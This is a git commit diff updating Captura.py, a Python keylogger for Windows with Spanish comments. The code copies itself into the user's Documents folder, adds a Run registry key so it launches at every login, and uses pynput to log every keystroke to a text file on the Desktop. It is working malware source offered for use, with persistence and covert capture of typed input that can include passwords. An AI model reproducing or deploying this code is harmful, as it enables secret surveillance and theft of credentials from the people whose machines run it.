2d68201d9a5a05696304a2543814ae770eb38aed
TOSIX <75531764+ATOMIX955@users.noreply.github.com>
2024-10-28 19:13:15 -0300

    Update Captura.py

--- Captura.py
+++ Captura.py
@@ -1,76 +1,70 @@
 try:
-    from pynput import keyboard   
-    import os  ,  shutil , pathlib
+    import threading
+    import shutil
+    from pynput import keyboard 
+    import os , wmi , sys
+    import socket 
     from datetime import datetime
-    import winreg
+    import winreg , base64
 except:
     os.system("pip install pynput")
-    os.system("pip install pathlib")
-    os.system("pip install shutil")
+    os.system("pip install wmi")
+    os.system("pip install datetime")
     os.system("pip install winreg")
+    os.system("pip install shutil")
+    os.system("pip install base64")
+    os.system("pip install threading")
+    os.system("cls")
+
 
 
 
 def reinicio():
-    try:
-        nombres_del_equipo = os.getenv("USERNAME")
-        p = pathlib.Path(__file__).absolute()
-        
-
-        ruta_opsolutas = f"C:\\Users\\{nombres_del_equipo}\\Documents\\{p.name}"# pone la ruta para que se gurde el kilooger ejempo
-        shutil.move(f"{__file__}", ruta_opsolutas)
-        program_path = ruta_opsolutas  # Reemplaza con la ruta de tu programa exe
-        nombre_del_equipos = os.getenv("USERNAME")
-
-        keyy = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(keyy, f"{nombre_del_equipos}", 0, winreg.REG_SZ, program_path)
-        winreg.CloseKey(keyy)
-    except:
-        pass
+   
+    #PODEMOS USAR DOS  RUTAS sys.executable o sys.argv[0] PARA ENCONTAR EL EXE Y EL NOMBE
+    shutil.move(f"{sys.argv[0]}",f"C:\\Users\\{os.getenv("UserName")}\\Documents\\{"".join(os.path.splitext(os.path.basename(sys.argv[0])))}")
+    keyy = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(keyy, f"{os.getenv("UserName")}", 0, winreg.REG_SZ, f"C:\\Users\\{os.getenv("UserName")}\\Documents\\{"".join(os.path.splitext(os.path.basename(sys.argv[0])))}")
+    winreg.CloseKey(keyy)
         
  
 def prisionaero(key):
     try:
-        nombre_del_equipo = os.getenv("USERNAME")
         hora = datetime.now()
         texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
-        txt = open(f"C:\\Users\\{nombre_del_equipo}\\Desktop\\systema.txt","a")#tenes que cambiar la ruta no te olvides de eso
+        txt = open(f"C:\\Users\\{os.getenv("UserName")}\\Desktop\\systema.txt","a")#tenes que cambiar la ruta no te olvides de eso
 
-        if key == keyboard.Key.f4:
+        if key == keyboard.Key.f1:
+            txt.write("SE TERMINO FIN MAÑANA ME VOY A DORMIR")
             return False
 
         elif key == keyboard.Key.space:
             txt.write(" ")
 
-        elif key == keyboard.Key.backspace:
-            pass    
-
         elif key == keyboard.Key.enter:
             txt.write("\n" + "\n")
             txt.write("   " + texto)
             txt.write("\n" + "\n")
+            
+         
 
         txt.write(str(key.char))
         
-
+       
     except AttributeError:
-        print()
+        pass
 
 
+    
 
 if __name__ == '__main__':
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   
-    s.settimeout(5)
-    try:
-        s.connect(("www.google.com", 80))
-    except (socket.gaierror, socket.timeout):
+    timer_thread = threading.Thread(target=reinicio)
+    timer_thread.start()
 
-        texto = open("Internet.txt","w")
-        texto.write("Sin conexión a internet..")
+    with keyboard.Listener(on_press=prisionaero) as comienzo:
+        comienzo.join()
 
-    else:
-        reinicio()
-        with keyboard.Listener(on_press=prisionaero) as comienzo:
-            comienzo.join()
-        s.close()
+    
+    
+    
+        
